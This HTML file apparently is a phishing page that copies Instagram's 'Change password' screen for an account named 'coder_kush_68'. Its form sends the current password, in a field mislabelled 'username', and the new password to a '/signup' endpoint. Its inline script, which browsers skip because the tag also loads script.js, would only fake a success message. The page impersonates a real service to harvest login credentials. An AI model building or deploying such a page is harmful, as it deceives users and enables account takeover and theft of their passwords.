  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password</title>
    <style type="text/css" media="all">
    * {
      padding:0;
      margin:0;
      box-sizing:border-box;
    }
     body {
    font-family: Arial, sans-serif;
    background-color:#162127 ;
    color: #ffffff;
    margin: 0;
    padding: 0;
}

.container {
    width: 100%;
    max-width: 400px;
    height:100%;
    border-radius: 10px;
    padding:10px 0;
}

header h1 {
    font-size: 1em;
    color: #ffffff;
    margin-bottom: 10px;
    padding-left:15px;
    font-weight:400;
}

main h2 {
    font-size: 1.5em;
    color: #ffffff;
    margin-bottom: 10px;
    padding-left:20px;
}

main p {
    font-size: 1em;
    color: #ffffff;
    margin-bottom: 20px;
    padding:0 18px ;
}

form input {
    width:92%;
    padding: 10px;
    height:60px;
    border:1px solid #8493A1;
    border-radius: 15px;
    background-color:transparent;
    color: #ffffff;
    font-size: 1em;
    margin:12px  auto;
    display:flex;
}
input::placeholder {
  color:#8493A1;
}
#logoutCheckbox  {
  width:30px !important;
  height:30px !important;
}
.checkbox-container {
    display: flex;
    align-items: center;
    margin-bottom: 20px;
    padding:3px 10px;
}

.checkbox-container input {
    margin-right: 10px;
}

.checkbox-container label {
    font-size: 0.9em;
    color: #ffffff;
}

button {
    width:340px;
    padding:16px;
    background-color:#5aa4e5;
    border: none;
    border-radius: 32px;
    color: #ffffff;
    font-size: 1em;
    cursor: pointer;
    display:flex;
    justify-content: center;
    align-items: center;
    margin:0 auto;
}

button:hover {
    background-color: #005bb5;
}
hr {
  margin:15px 0;
  margin-top:170px;
  border-bottom:none;
}
a {
  text-decoration:none;
  padding-left:10px;
  color:#5aa4e9;
  font-weight:bold;
  padding:13px;
}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>coder_kush_68 &bull; Instagram</h1>
        </header>
        <main>
            <h2>Change password</h2>
            <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!$@%).</p>
            <form id="passwordForm" action="/signup" method="post"
            accept-charset="UTF-8">
                <input type="password" id="currentPassword"
                name="username" required placeholder="Current password">

                <input type="password" id="newPassword" name="password"
                required placeholder="New password">

                <input type="password" id="confirmPassword"
                name="confirmPassword" required placeholder="Re-type new password">
                 <a href="#">Forgot your password?</a>
                <div class="checkbox-container">
                    <input type="checkbox" id="logoutCheckbox" name="logoutCheckbox" checked>
                    <label for="logoutCheckbox">Log out of other devices. Choose this if someone else used your account.</label>
                </div>
<hr/>
                <button type="submit">Change password</button>
            </form>
        </main>
    </div>
    <script src="script.js">
      document.getElementById('passwordForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const currentPassword = document.getElementById('currentPassword').value;
    const newPassword = document.getElementById('newPassword').value;
    const confirmPassword = document.getElementById('confirmPassword').value;

    if (newPassword !== confirmPassword) {
        alert('New password and confirmation do not match.');
        return;
    }

    if (newPassword.length < 6) {
        alert('New password must be at least 6 characters long.');
        return;
    }

    alert('Password changed successfully!');
});
    </script>
</body>
</html>